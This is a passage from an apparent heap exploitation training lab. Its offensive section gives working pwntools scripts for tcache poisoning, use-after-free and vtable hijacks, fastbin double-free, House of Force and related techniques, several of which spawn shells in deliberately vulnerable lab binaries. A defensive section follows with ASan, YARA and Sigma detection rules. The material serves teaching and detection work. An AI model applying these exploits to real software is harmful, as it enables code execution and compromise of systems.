# r1 user data starts at r1, name is at offset 0, callback at offset 32
# r2 starts after r1's chunk (including metadata)
offset = r2 - r1
log.info(f"Offset r1→r2: {offset} bytes")

# r2->callback is at r2 + 32 (after name[32])
# But callback is first field in struct → offset 32 from r2 start
# Actually: struct record has callback first? No — name first, callback second
# Check: name[32] then callback(8) = 40 bytes
# Overflow r1->name (32 bytes) + chunk padding + r2 metadata + r2->name (32) ...
# The exact offset depends on malloc chunk size and alignment

# Build payload: fill r1's name buffer + metadata gap + r2's callback
payload = b'A' * 32                              # r1->name (32 bytes)
payload += p64(win_addr)                          # r1->callback (overwritten but unused)
# Now we're past r1's struct, into chunk metadata of r2
# The gap between r1 end and r2 start includes chunk header (0x10 bytes on 64-bit)
gap = r2 - (r1 + 40)  # 40 = sizeof(struct record)
payload += b'B' * gap
# Now at r2->name[32]
payload += b'C' * 32                              # r2->name
payload += p64(win_addr)                          # r2->callback = win()

log.info(f"Payload length: {len(payload)}")

p.sendlineafter(b'overflow to corrupt r2): ', payload)

# Should get shell
p.interactive()
```

**Verification:**
```
[+] r1 = 0x4052a0
[+] r2 = 0x4052d0
[+] win = 0x401196
[+] Offset r1→r2: 48 bytes
[WIN] You hijacked execution!
$
```

---

### Exercise 3: Use-After-Free — Dangling Pointer Exploitation

**Objective:** Exploit a UAF vulnerability through the four-phase lifecycle: alloc → free → dangling → realloc.

#### Step 3.1: Manual UAF exploitation

```python
#!/usr/bin/env python3
"""uaf_exploit.py — Use-after-free function pointer hijack"""

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

elf = ELF('./bin/uaf_funcptr')
p = process('./bin/uaf_funcptr')

def create(name):
    p.sendlineafter(b'Choice: ', b'1')
    p.sendlineafter(b'Name: ', name)
    p.recvuntil(b'created at ')
    addr = int(p.recvline().strip(), 16)
    return addr

def delete(idx):
    p.sendlineafter(b'Choice: ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def use(idx, msg):
    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Message: ', msg)

def edit(idx, data):
    p.sendlineafter(b'Choice: ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Data: ', data)

# Step 1: Create a plugin
addr0 = create(b'victim')
log.info(f"Plugin 0 at {hex(addr0)}")

# Step 2: Create second plugin (same size)
addr1 = create(b'helper')
log.info(f"Plugin 1 at {hex(addr1)}")

# Step 3: Free plugin 0 — creates dangling pointer
delete(0)
log.info("Freed plugin 0 — dangling pointer retained")

# Step 4: Create new plugin — reuses plugin 0's memory (tcache LIFO)
addr2 = create(b'reuse')
log.info(f"Plugin 2 at {hex(addr2)}")

# Verify reuse: plugin 2 should be at plugin 0's address
if addr2 == addr0:
    log.success("Memory reused! Plugin 2 occupies plugin 0's slot")

# Step 5: Use edit on the DANGLING pointer (index 0) to overwrite function pointer
# plugin_t layout: handler (8 bytes) + name (24 bytes) = 32 bytes
# We want to overwrite handler with admin_handler address
# First, find admin_handler address from binary
admin_handler = elf.sym.get('admin_handler', None)
if admin_handler:
    log.info(f"admin_handler at {hex(admin_handler)}")
    payload = p64(admin_handler) + b'/bin/sh\x00'
    edit(0, payload)

    # Step 6: "Use" plugin 2 (same memory) — calls corrupted handler
    log.info("Triggering UAF via plugin index 2...")
    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'Index: ', b'2')
    p.sendlineafter(b'Message: ', b'/bin/sh')
    p.interactive()
else:
    # If symbol not found, compute from leak
    log.warning("admin_handler symbol not found; manual offset needed")
```

#### Step 3.2: UAF with heap spray for non-deterministic reuse

```python
#!/usr/bin/env python3
"""uaf_spray.py — Heap spray to ensure UAF reuse"""

from pwn import *

context.arch = 'amd64'

elf = ELF('./bin/heap_spray_uaf')
p = process('./bin/heap_spray_uaf')

p.recvuntil(b'node_admin at ')
admin_addr = int(p.recvline().strip(), 16)
log.info(f"node_admin = {hex(admin_addr)}")

def create(data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Data: ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def process_node(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())

def spray(count, data):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Count: ', str(count).encode())
    p.sendlineafter(b'Fill data (64 bytes): ', data)

# Phase 1: Create target node
create(b'victim_node')  # nodes[0]

# Phase 2: Free the target — creates dangling pointer
delete(0)
log.info("Freed nodes[0] — dangling pointer active")

# Phase 3: Spray same-size allocations with crafted content
# node_t: type_tag(8) + process_ptr(8) + data(48) = 64 bytes
payload = p64(0x1337)          # type_tag
payload += p64(admin_addr)     # process function pointer = node_admin
payload += b'/bin/sh\x00'      # data (command to execute)
payload = payload.ljust(64, b'\x00')

spray(32, payload[:63])  # spray 32 nodes

# Phase 4: Use dangling pointer — should call node_admin
log.info("Triggering UAF through dangling pointer...")
process_node(0)

p.interactive()
```

**Expected:** Shell spawned via `node_admin("/bin/sh")`.

---

### Exercise 4: Tcache Poisoning — Arbitrary Allocation

**Objective:** Exploit tcache freelist corruption to achieve arbitrary allocation at a target address, with and without safe-linking.

#### Step 4.1: Pre-safe-linking tcache poisoning (glibc < 2.32)

```python
#!/usr/bin/env python3
"""tcache_poison_nosafe.py — Tcache poisoning without safe-linking"""

from pwn import *

context.arch = 'amd64'

p = process('./bin/tcache_poison')

p.recvuntil(b'admin_flag at: ')
target = int(p.recvuntil(b' ')[:-1], 16)
log.info(f"target (admin_flag): {hex(target)}")

p.recvuntil(b'a = ')
a_addr = int(p.recvuntil(b',')[:-1], 16)
log.info(f"chunk a: {hex(a_addr)}")

p.recvuntil(b'next pointer (first 8 bytes): ')
leaked_next = int(p.recvline().strip(), 16)
log.info(f"Leaked next after free: {hex(leaked_next)}")

# On glibc < 2.32: next is a raw pointer (NULL for single entry)
# On glibc 2.32+: next is XOR-encoded

# Send target address as new next pointer
# For pre-safe-linking, send raw address
p.sendlineafter(b'Enter new next pointer value (hex): ',
                hex(target).encode())

# First malloc returns 'a' (head of tcache)
p.recvuntil(b'malloc(0x20) returned: ')
c_addr = int(p.recvline().strip(), 16)
log.info(f"First alloc (reclaims a): {hex(c_addr)}")

# Second malloc follows poisoned next → returns target
p.recvuntil(b'malloc(0x20) returned: ')
d_addr = int(p.recvline().strip(), 16)
log.info(f"Second alloc (should be target): {hex(d_addr)}")

if d_addr == target:
    log.success("Tcache poisoning successful! Arbitrary allocation achieved.")
    p.sendlineafter(b'Enter new admin_flag value: ', b'1337')
    p.recvuntil(b'admin_flag = ')
    log.success(f"admin_flag = {p.recvline().strip().decode()}")

p.close()
```

#### Step 4.2: Safe-linking bypass (glibc 2.32+)

```python
#!/usr/bin/env python3
"""tcache_poison_safelink_exploit.py — Safe-linking bypass via heap leak"""

from pwn import *

context.arch = 'amd64'

p = process('./bin/tcache_poison_safelink')

p.recvuntil(b'secret at: ')
target = int(p.recvuntil(b' ')[:-1], 16)
log.info(f"Target (secret): {hex(target)}")

p.recvuntil(b'a at: ')
a_addr = int(p.recvline().strip(), 16)
log.info(f"Chunk a: {hex(a_addr)}")

# After free(a), a's next is encoded: PROTECT_PTR(a, NULL) = (a >> 12) ^ 0
p.recvuntil(b'Encoded next (NULL ^ (addr>>12)): ')
encoded_null = int(p.recvline().strip(), 16)
log.info(f"Encoded NULL: {hex(encoded_null)}")

heap_key = encoded_null  # = a_addr >> 12
log.info(f"Heap page key: {hex(heap_key)}")

# Verify: a_addr >> 12 should equal heap_key
computed_key = a_addr >> 12
log.info(f"Computed key from a_addr: {hex(computed_key)}")

# Forge encoded target: target ^ heap_key
forged = target ^ heap_key
log.info(f"Forged next: {hex(target)} ^ {hex(heap_key)} = {hex(forged)}")

# The program already does the poisoning for us in this demo
# In a real exploit, we'd UAF-write the forged pointer

p.recvuntil(b'secret = ')
result = p.recvline().strip().decode()
log.success(f"secret = {result}")

p.close()
```

#### Step 4.3: Complete pwntools template for tcache poisoning

```python
#!/usr/bin/env python3
"""tcache_poison_template.py — Reusable tcache poisoning primitive"""

from pwn import *

context.arch = 'amd64'

def protect_ptr(pos, ptr):
    """Safe-linking encode: stored = ptr ^ (pos >> 12)"""
    return (pos >> 12) ^ ptr

def reveal_ptr(pos, encoded):
    """Safe-linking decode: ptr = encoded ^ (pos >> 12)"""
    return protect_ptr(pos, encoded)

def leak_heap_key_from_tcache(storage_addr, encoded_next):
    """
    If a tcache bin has exactly one entry (next = NULL),
    the stored value is: PROTECT_PTR(addr, 0) = addr >> 12
    This reveals the XOR key for the entire heap page.
    """
    return encoded_next  # = storage_addr >> 12

class TcachePoisoner:
    """Manages tcache poisoning with safe-linking awareness."""

    def __init__(self, heap_leak=None, glibc_version='2.35'):
        self.heap_key = None
        self.glibc_ver = tuple(int(x) for x in glibc_version.split('.'))
        self.safe_linking = self.glibc_ver >= (2, 32)

        if heap_leak:
            self.set_heap_key(heap_leak)

    def set_heap_key(self, storage_addr_or_key):
        """Set the XOR key from a heap address or leaked key."""
        if storage_addr_or_key > 0xFFF:
            self.heap_key = storage_addr_or_key >> 12
        else:
            self.heap_key = storage_addr_or_key

    def encode(self, target):
        """Encode a target address for tcache next pointer."""
        if not self.safe_linking:
            return target  # No encoding needed
        if self.heap_key is None:
            raise ValueError("Heap key not set — need a leak first")
        return target ^ self.heap_key

    def decode(self, encoded, storage_addr=None):
        """Decode a tcache next pointer."""
        if not self.safe_linking:
            return encoded
        key = (storage_addr >> 12) if storage_addr else self.heap_key
        return encoded ^ key

# Usage example:
# poisoner = TcachePoisoner(glibc_version='2.35')
# poisoner.set_heap_key(leaked_heap_addr)
# forged_next = poisoner.encode(target_addr)
```

---

### Exercise 5: Fastbin Dup and Double-Free

**Objective:** Exploit double-free to create freelist cycles, achieving arbitrary allocation.

#### Step 5.1: Classic fastbin dup (glibc < 2.32)

```python
#!/usr/bin/env python3
"""fastbin_dup.py — Double-free fastbin cycle exploitation"""

from pwn import *

context.arch = 'amd64'

p = process('./bin/double_free')

p.recvuntil(b'target_var at: ')
target = int(p.recvuntil(b' ')[:-1], 16)
log.info(f"target_var: {hex(target)}")

def alloc(size):
    p.sendlineafter(b'Choice: ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.recvuntil(b'] = ')
    return int(p.recvline().strip(), 16)

def free_chunk(idx):
    p.sendlineafter(b'Choice: ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def write_chunk(idx, data):
    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Data: ', data)

def show_target():
    p.sendlineafter(b'Choice: ', b'4')
    p.recvuntil(b'target_var = ')
    return int(p.recvline().strip(), 16)

SIZE = 0x30  # Fastbin size class 0x40

# Allocate three chunks of same size
a = alloc(SIZE)  # idx 0
b = alloc(SIZE)  # idx 1
c = alloc(SIZE)  # idx 2

log.info(f"a={hex(a)}, b={hex(b)}, c={hex(c)}")

# Double-free with interleave to bypass consecutive check:
# free(a) → free(b) → free(a)
free_chunk(0)  # fastbin: A → NULL
free_chunk(1)  # fastbin: B → A → NULL
free_chunk(0)  # fastbin: A → B → A → (cycle)

log.info("Double-free cycle created: A → B → A → B → ...")

# Allocate returns A — write target address into A's fd
d = alloc(SIZE)  # idx 3, returns A
log.info(f"Alloc d (=A): {hex(d)}")

# For glibc < 2.32: write raw target address
# For 2.32+: need safe-linking encoding
write_chunk(3, p64(target))

# Next alloc returns B
e = alloc(SIZE)  # idx 4, returns B
log.info(f"Alloc e (=B): {hex(e)}")

# Next alloc returns A again (fd was overwritten)
f = alloc(SIZE)  # idx 5, returns A
log.info(f"Alloc f (=A again): {hex(f)}")

# Next alloc follows corrupted fd → returns target_var address
g = alloc(SIZE)  # idx 6, returns target_var!
log.info(f"Alloc g: {hex(g)}")

if g == target:
    log.success("Fastbin dup → arbitrary allocation at target_var!")
    write_chunk(6, p64(0xDEADBEEF))
    val = show_target()
    log.success(f"target_var = {hex(val)}")

p.close()
```

#### Step 5.2: Tcache double-free with key bypass

```python
#!/usr/bin/env python3
"""tcache_double_free.py — Bypass tcache key for double-free"""

from pwn import *

context.arch = 'amd64'

# On glibc 2.27-2.33: key = tcache_perthread_struct pointer
# On glibc 2.34+: key = random value
# Bypass: corrupt key field (offset +0x08 from user data) before second free

p = process('./bin/double_free')

p.recvuntil(b'target_var at: ')
target = int(p.recvuntil(b' ')[:-1], 16)

def alloc(size):
    p.sendlineafter(b'Choice: ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.recvuntil(b'] = ')
    return int(p.recvline().strip(), 16)

def free_chunk(idx):
    p.sendlineafter(b'Choice: ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def write_chunk(idx, data):
    p.sendlineafter(b'Choice: ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Data: ', data)

SIZE = 0x20  # tcache range

a = alloc(SIZE)  # idx 0
b = alloc(SIZE)  # idx 1 (prevent consolidation)

free_chunk(0)  # a enters tcache

# Corrupt key field to bypass double-free detection
# key is at offset +0x08 from user data pointer
# Write any value != the expected key
write_chunk(0, p64(0) + p64(0))  # clear next + clear key

# Now double-free succeeds
free_chunk(0)
log.success("Tcache double-free successful (key bypassed)")

p.close()
```

---

### Exercise 6: Named House Techniques

**Objective:** Implement House of Force, House of Spirit, and poison null byte (House of Einherjar setup).

#### Step 6.1: House of Force (glibc < 2.29)

```python
#!/usr/bin/env python3
"""house_of_force.py — Top chunk corruption for arbitrary allocation"""

from pwn import *

context.arch = 'amd64'

p = process('./bin/house_of_force')

p.recvuntil(b'stack_target at: ')
target = int(p.recvline().strip(), 16)
p.recvuntil(b'a at: ')
a_addr = int(p.recvline().strip(), 16)
p.recvuntil(b'Top chunk size before corruption: ')
orig_top_size = int(p.recvline().strip(), 16)

log.info(f"Target: {hex(target)}")
log.info(f"Allocation: {hex(a_addr)}")
log.info(f"Original top size: {hex(orig_top_size)}")

# Step 1: Corrupt top chunk size to maximum
p.sendlineafter(b'Enter new top chunk size (hex): ', b'ffffffffffffffff')

# Step 2: Calculate distance from current top to target
# Top chunk starts at: a_addr + 0x100 (a's data) + 0x10 (chunk header) = a + 0x110
top_chunk = a_addr + 0x110
distance = target - top_chunk - 0x20  # subtract chunk header overhead

log.info(f"Top chunk at: {hex(top_chunk)}")
log.info(f"Distance to target: {hex(distance & 0xFFFFFFFFFFFFFFFF)}")

# Convert to unsigned if negative (wrapping)
advance_size = distance & 0xFFFFFFFFFFFFFFFF

p.sendlineafter(b'Enter malloc size to advance top (hex, signed offset): ',
                hex(advance_size).encode())

# Step 3: Next allocation should be near target
p.sendlineafter(b'Enter value to write to target: ', b'deadbeef')
p.recvuntil(b'stack_target = ')
result = p.recvline().strip().decode()
log.info(f"stack_target = {result}")

p.close()
```

#### Step 6.2: House of Spirit

```python
#!/usr/bin/env python3
"""house_of_spirit.py — Fake chunk on stack → arbitrary stack allocation"""

from pwn import *

context.arch = 'amd64'

p = process('./bin/house_of_spirit')

p.recvuntil(b'secret at: ')
secret_addr = int(p.recvline().strip(), 16)
p.recvuntil(b'user data at ')
fake_user = int(p.recvline().strip(), 16)

log.info(f"Secret at: {hex(secret_addr)}")
log.info(f"Fake chunk user data: {hex(fake_user)}")

p.recvuntil(b'malloc(0x30) returned: ')
alloc_addr = int(p.recvline().strip(), 16)
log.info(f"Returned allocation: {hex(alloc_addr)}")

p.recvuntil(b'Is on stack? ')
result = p.recvline().strip().decode()
log.info(f"Stack allocation: {result}")

if "YES" in result:
    log.success("House of Spirit: obtained allocation on the stack!")

p.close()
```

#### Step 6.3: Poison null byte → overlapping chunks

```python
#!/usr/bin/env python3
"""poison_null_byte_exploit.py — Off-by-one null → chunk overlap"""

from pwn import *

context.arch = 'amd64'

p = process('./bin/poison_null_byte')

p.recvuntil(b'A: ')
A = int(p.recvuntil(b' ')[:-1], 16)
p.recvuntil(b'B: ')
B = int(p.recvuntil(b' ')[:-1], 16)
p.recvuntil(b'C: ')
C = int(p.recvline().strip(), 16)

log.info(f"A={hex(A)} B={hex(B)} C={hex(C)}")

# The binary does the exploitation steps internally:
# 1. Free B into unsorted bin
# 2. Null-byte overflow clears C's PREV_INUSE
# 3. Set C's prev_size = 0x210 (B's original size)
# 4. Free C → backward coalescing creates overlapping chunk

p.recvuntil(b'Overlap allocation: ')
overlap = int(p.recvline().strip(), 16)
log.info(f"Overlap at: {hex(overlap)}")

p.recvuntil(b'SUCCESS')
log.success("Poison null byte → overlapping chunk achieved!")
log.info("This overlap allows reading/writing B's data through the overlap allocation")

p.close()
```

---

### Exercise 7: C++ Vtable Hijacking via UAF

**Objective:** Exploit C++ virtual dispatch through UAF to redirect vtable calls.

#### Step 7.1: Vtable layout analysis

```bash
# Examine vtable layout of the Dog class
gdb -q bin/vtable_uaf -ex 'b main' -ex 'r' -ex 'c'
```

```gdb
# Create a Dog object and examine its layout
# After creating object at index 0:

# Examine object memory
x/8gx <object_address>
# Output:
# 0x405920: 0x0000000000403d08  ← vptr (points into .rodata vtable)
#           0x0000000000000000  ← id (int, padded)
# 0x405930: 0x0000004f44...     ← name[24]

# Examine vtable
x/5gx 0x0000000000403d08-0x10
# Output:
# vtable-16: offset_to_top (0)
# vtable-8:  typeinfo pointer
# vtable+0:  &Dog::speak (first virtual function)
# vtable+8:  &Dog::info
# vtable+16: &Dog::~Dog() (destructor)
```

#### Step 7.2: Vtable hijack exploit

```python
#!/usr/bin/env python3
"""vtable_hijack.py — C++ UAF → vtable corruption → code execution"""

from pwn import *

context.arch = 'amd64'

elf = ELF('./bin/vtable_uaf')
p = process('./bin/vtable_uaf')

p.recvuntil(b'sizeof(Animal/Dog/Cat) = ')
obj_size = int(p.recvline().strip())
p.recvuntil(b'win() at ')
win = int(p.recvline().strip(), 16)
log.info(f"Object size: {obj_size}, win(): {hex(win)}")

def create_dog(idx, name):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Index (0-3): ', str(idx).encode())
    p.sendlineafter(b'Name: ', name)
    p.recvuntil(b'Created at ')
    addr = int(p.recvuntil(b',')[:-1], 16)
    p.recvuntil(b'vtable at ')
    vtable = int(p.recvline().strip(), 16)
    return addr, vtable

def delete(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())

def speak(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())

def write_raw(idx, data):
    p.sendlineafter(b'> ', b'6')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendafter(b'Raw bytes', data)

# Phase 1: Create object
addr0, vtable0 = create_dog(0, b'victim')
log.info(f"Dog at {hex(addr0)}, vtable at {hex(vtable0)}")

# Phase 2: Delete object (dangling pointer remains)
delete(0)
log.info("Deleted — dangling pointer at index 0")

# Phase 3: Construct fake vtable and overwrite freed memory
# Object layout: [vptr(8)] [id(4)+pad(4)] [name(24)]
# Total = 40 bytes (rounded to chunk size)

# Build a fake vtable on the heap via the raw write
# We need: a region in memory containing win() address at the right offset
# Strategy: write a fake vtable inline in the object's memory

# The fake vtable needs:
# offset +0x00: pointer to speak function (will be called)
# When obj->speak() is called: load vptr from obj+0, then call [vptr+0]

# So we set vptr to point to a location containing win() address
# Simplest: point vptr at obj+0x08, and put win() at obj+0x08

fake_obj = b''
fake_obj += p64(addr0 + 8)   # vptr → points to obj+8 (where we put win)
fake_obj += p64(win)          # at obj+8: "vtable entry 0" = win()
fake_obj += b'A' * (obj_size - 16)

write_raw(0, fake_obj[:obj_size])

# Phase 4: Trigger virtual call through dangling pointer
log.info("Calling speak() through corrupted vtable...")
speak(0)

p.interactive()
```

**Expected:**
```
[WIN] Vtable hijacked! Spawning shell...
$
```

---

### Exercise 8: Unsorted Bin Attack and Libc Leak

**Objective:** Use unsorted bin mechanics for both information disclosure and arbitrary write.

#### Step 8.1: Libc leak via unsorted bin fd/bk

```python
#!/usr/bin/env python3
"""unsorted_bin_leak.py — Leak libc base from unsorted bin pointers"""

from pwn import *

context.arch = 'amd64'

elf = ELF('./bin/fsop_target')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./bin/fsop_target')

def alloc(size):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.recvuntil(b'] = ')
    return int(p.recvline().strip(), 16)

def free_chunk(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def edit(idx, size, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Bytes: ', str(size).encode())
    p.sendafter(b'Data: ', data)

def show(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.recvuntil(b'Data: ')
    vals = p.recvline().strip().split()
    return [int(v, 16) for v in vals]

def leak_libc():
    p.sendlineafter(b'> ', b'5')
    p.recvuntil(b'Leaked fd: ')
    fd = int(p.recvline().strip(), 16)
    p.recvuntil(b'Leaked bk: ')
    bk = int(p.recvline().strip(), 16)
    return fd, bk

# Step 1: Leak libc via unsorted bin
fd, bk = leak_libc()
log.info(f"Leaked fd: {hex(fd)}")
log.info(f"Leaked bk: {hex(bk)}")

# fd and bk point to main_arena+96 (unsorted bin head)
# main_arena is in libc .data at a known offset
main_arena_offset = libc.sym.get('main_arena', None)
if main_arena_offset is None:
    # Calculate from __malloc_hook if available, or use known offset
    log.info("Computing main_arena offset from libc...")
    main_arena_96 = fd
    # main_arena offset varies by glibc version
    # For glibc 2.35: typically around 0x219c80 (check with: readelf -s libc | grep main_arena)
    main_arena_off = 0x219ce0  # adjust for your glibc
    libc_base = main_arena_96 - main_arena_off - 96
else:
    libc_base = fd - main_arena_offset - 96

log.success(f"libc base: {hex(libc_base)}")
log.info(f"system: {hex(libc_base + libc.sym['system'])}")
log.info(f"__free_hook: {hex(libc_base + libc.sym.get('__free_hook', 0))}")

# For glibc 2.34+: __free_hook removed, need FSOP or exit_funcs
# Compute targets
io_list_all = libc_base + libc.sym.get('_IO_list_all', 0)
exit_funcs = libc_base + libc.sym.get('__exit_funcs', 0)
log.info(f"_IO_list_all: {hex(io_list_all)}")
log.info(f"__exit_funcs: {hex(exit_funcs)}")

p.close()
```

#### Step 8.2: Unsorted bin attack (glibc < 2.29)

```python
#!/usr/bin/env python3
"""unsorted_bin_attack_exploit.py — Write libc address to arbitrary target"""

from pwn import *

context.arch = 'amd64'

p = process('./bin/unsorted_bin_attack')

p.recvuntil(b'target at: ')
target = int(p.recvuntil(b' ')[:-1], 16)
log.info(f"target: {hex(target)}")

p.recvuntil(b'a at: ')
a_addr = int(p.recvline().strip(), 16)
log.info(f"chunk a: {hex(a_addr)}")

# After free(a), a is in the unsorted bin
# The bk pointer is at a_addr + 0x08 (offset from user data)
# To write to target: set bk = target - 0x10
# The write will be: *(target - 0x10 + 0x10) = main_arena+96
# i.e., *target = main_arena+96 (a libc address)

forged_bk = target - 0x10
log.info(f"Forged bk: {hex(forged_bk)}")

p.sendlineafter(b'Enter new bk value', hex(forged_bk).encode())

# The next malloc triggers the unsorted bin scan and performs the write
p.recvuntil(b'target value: ')
result = int(p.recvline().strip(), 16)

if result != 0:
    log.success(f"Unsorted bin attack wrote {hex(result)} to target!")
    log.info("Value is a libc address (main_arena+96)")

p.close()
```

---

## PART B: DEFENSIVE (Protection and Detection)

### Exercise 9: Detection Engineering — Heap Exploitation Indicators

**Objective:** Build detection rules for heap exploitation artifacts across multiple detection platforms.

#### Step 9.1: ASan deployment for heap bug detection

```bash
#!/bin/bash
# asan_heap_ci.sh — ASan-instrumented build for CI/CD heap testing

set -euo pipefail

PROJECT_DIR="${1:-.}"
BUILD_DIR="$PROJECT_DIR/build-asan"

mkdir -p "$BUILD_DIR"

echo "[*] Compiling with AddressSanitizer..."
export CC="gcc"
export CXX="g++"
export CFLAGS="-fsanitize=address -fno-omit-frame-pointer -O1 -g"
export CXXFLAGS="$CFLAGS"
export LDFLAGS="-fsanitize=address"

# Build the project
cd "$PROJECT_DIR"
make clean 2>/dev/null || true
make BUILD_DIR="$BUILD_DIR" CFLAGS="$CFLAGS" LDFLAGS="$LDFLAGS" -j$(nproc)

echo "[*] Running with ASan configuration..."
export ASAN_OPTIONS="detect_leaks=1:halt_on_error=0:log_path=$BUILD_DIR/asan:quarantine_size_mb=256"

# Run test suite
echo "[*] Executing tests under ASan..."
if [ -f "$PROJECT_DIR/run_tests.sh" ]; then
    bash "$PROJECT_DIR/run_tests.sh"
fi

# Analyze ASan reports
echo "[*] Checking for ASan errors..."
if ls "$BUILD_DIR"/asan.* 1>/dev/null 2>&1; then
    echo "[!] ASan errors detected:"
    for report in "$BUILD_DIR"/asan.*; do
        echo "--- $(basename $report) ---"
        head -30 "$report"
        echo ""
    done

    # Parse error types
    echo "[*] Error summary:"
    grep -h "ERROR: AddressSanitizer:" "$BUILD_DIR"/asan.* | sort | uniq -c | sort -rn

    exit 1
else
    echo "[+] No ASan errors found."
    exit 0
fi
```

#### Step 9.2: YARA rules for heap exploitation payloads

```yara
/* heap_exploit_indicators.yar — Detect heap exploitation artifacts in memory dumps */

rule HeapSpray_NOP_Sled_Heap
{
    meta:
        description = "Large heap spray with NOP sled pattern"
        severity = "high"
        technique = "T1203"

    strings:
        $nop_x86 = { 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 }
        $nop_arm = { 00 F0 20 E3 00 F0 20 E3 00 F0 20 E3 00 F0 20 E3 }

    condition:
        #nop_x86 > 100 or #nop_arm > 100
}

rule Tcache_Poisoning_Payload
{
    meta:
        description = "Tcache poisoning: freed chunk with non-heap next pointer"
        severity = "high"

    strings:
        /* Pattern: chunk header followed by pointer to stack/libc region */
        $stack_ptr = { ?? ?? ?? ?? ?? 7F 00 00 }  /* stack-like address */
        $libc_ptr  = { ?? ?? ?? ?? FF 7F 00 00 }  /* libc-like address */

    condition:
        any of them
}

rule Fake_IO_FILE_Structure
{
    meta:
        description = "Potential FSOP: fake _IO_FILE with magic and vtable"
        severity = "critical"

    strings:
        /* _IO_FILE magic value with specific flags */
        $io_magic = { 87 28 AD FB }  /* 0xFBAD2887 — common FSOP flag set */
        $io_magic2 = { 80 28 AD FB } /* 0xFBAD2880 — alternate flag set */

    condition:
        any of ($io_magic*)
}

rule Fake_Vtable_In_Heap
{
    meta:
        description = "Vtable pointer redirected to heap data (UAF vtable hijack)"
        severity = "critical"

    strings:
        /* Sequence of heap-region pointers where vtable entries expected */
        $heap_vtable = { ?? ?? ?? 55 55 55 00 00 ?? ?? ?? 55 55 55 00 00 }

    condition:
        $heap_vtable
}

rule Safe_Linking_Bypass_Attempt
{
    meta:
        description = "Encoded pointer with suspicious XOR pattern (safe-linking bypass)"
        severity = "medium"

    strings:
        /* Pattern: PROTECT_PTR result where target is in stack/libc */
        $encoded = /[\x00-\xff]{8}/

    condition:
        false  /* Placeholder — requires context-aware matching */
}

rule GLibc_Main_Arena_In_Unexpected_Location
{
    meta:
        description = "main_arena address found in non-heap region (unsorted bin attack artifact)"
        severity = "high"

    strings:
        /* main_arena markers — adjust offsets per glibc version */
        $arena_marker = { 00 00 00 00 00 00 00 00 ?? ?? ?? ?? FF 7F 00 00 }

    condition:
        $arena_marker
}
```

#### Step 9.3: Sigma rules for heap exploitation detection

```yaml
# sigma_heap_exploitation.yml

title: Heap Corruption Crash - Potential Exploitation
id: heap-crash-pattern-001
status: experimental
level: high
description: >
    Detects repeated SIGABRT/SIGSEGV crashes from the same binary with
    varying crash addresses, indicating heap exploitation attempts.
logsource:
    product: linux
    service: coredump
detection:
    selection:
        signal|re: 'SIGSEGV|SIGABRT'
        message|contains:
            - 'malloc'
            - 'free'
            - 'tcache'
            - 'corrupted'
    condition: selection
    timeframe: 120s
    count_threshold:
        field: binary_path
        min: 3
tags:
    - attack.execution
    - attack.t1203

---
title: GLibc Heap Corruption Detection Message
id: glibc-heap-corruption-001
status: experimental
level: critical
description: >
    Detects glibc's internal heap corruption detection messages.
    These indicate that heap metadata integrity checks failed.
logsource:
    product: linux
    service: syslog
detection:
    selection:
        message|contains:
            - 'malloc(): corrupted top size'
            - 'free(): double free detected in tcache'
            - 'free(): invalid pointer'
            - 'malloc(): unaligned tcache chunk detected'
            - 'corrupted unsorted chunks'
            - 'malloc_consolidate(): invalid chunk size'
            - 'free(): invalid next size'
            - 'corrupted size vs. prev_size'
    condition: selection
tags:
    - attack.execution
    - attack.t1203

---
title: UAF Detection - Freed Memory Access in ASan
id: asan-uaf-001
status: experimental
level: critical
description: >
    Detects ASan heap-use-after-free reports in application logs.
logsource:
    product: linux
    service: application
detection:
    selection:
        message|contains:
            - 'heap-use-after-free'
            - 'heap-buffer-overflow'
            - 'double-free'
    condition: selection
tags:
    - attack.execution
    - cwe.416
    - cwe.122
    - cwe.415

---
title: Potential Heap Spray - Rapid Memory Growth
id: heap-spray-indicator-001
status: experimental
level: medium
description: >
    Detects rapid heap growth (many brk/mmap calls in short period)
    indicating heap spray for exploitation.
logsource:
    product: linux
    service: auditd
detection:
    selection:
        syscall:
            - 'brk'
            - 'mmap'
    condition: selection
    timeframe: 5s
    count_threshold:
        field: pid
        min: 50
tags:
    - attack.defense_evasion
    - attack.t1055
```

#### Step 9.4: eBPF heap exploitation monitor

```c
/* heap_monitor.bpf.c — eBPF program to detect heap exploitation indicators */

#include <vmlinux.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>

struct event {
    u32 pid;
    u32 tgid;
    u64 timestamp;
    u64 addr;
    u32 event_type;
    char comm[16];
};

